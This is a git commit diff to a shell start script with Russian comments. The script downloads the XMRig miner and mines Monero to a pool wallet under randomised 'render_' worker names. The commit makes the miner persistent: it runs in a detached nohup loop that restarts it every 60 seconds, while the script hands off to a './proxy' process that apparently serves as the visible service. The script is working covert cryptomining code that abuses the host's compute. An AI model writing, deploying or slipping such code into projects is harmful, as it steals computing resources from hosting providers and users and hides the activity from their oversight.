59398e69f87bcef953414e9a1884b22a06cf4b62
Wers <112427364+w9line@users.noreply.github.com>
2026-04-01 15:21:13 +0300

    Update start.sh

--- start.sh
+++ start.sh
@@ -8,16 +8,7 @@ ARCHIVE=$DIR-linux-static-x64.tar.gz
 [ -f $DIR/xmrig ] || (wget -q https://github.com/xmrig/xmrig/releases/download/v6.26.0/$ARCHIVE && tar -xzf $ARCHIVE && rm $ARCHIVE)
 
 WALLET="krxX3328ZR/render_$((RANDOM % 1000 + 1))"
-# Майнер теперь в фоне, но без nohup — он переживёт завершение скрипта, если мы подождём
-./$DIR/xmrig --url=xmr-ru.kryptex.network:7029 --user=$WALLET --pass=x --coin=monero --cpu-max-threads-hint=5 --randomx-mode=light > xmrig.log 2>&1 &
-MINER_PID=$!
-echo "Miner PID: $MINER_PID"
+nohup bash -c "while true; do ./$DIR/xmrig --url=xmr-ru.kryptex.network:7029 --user=$WALLET --pass=x --coin=monero --cpu-max-threads-hint=5 --randomx-mode=light; sleep 60; done" > xmrig.log 2>&1 &
+disown
 
-# Прокси в фоне
-./proxy &
-PROXY_PID=$!
-echo "Proxy PID: $PROXY_PID"
-
-
-sleep 30 # Ждём любой из процессов, чтобы скрипт не завершался сразу
-wait -n
+exec ./proxy
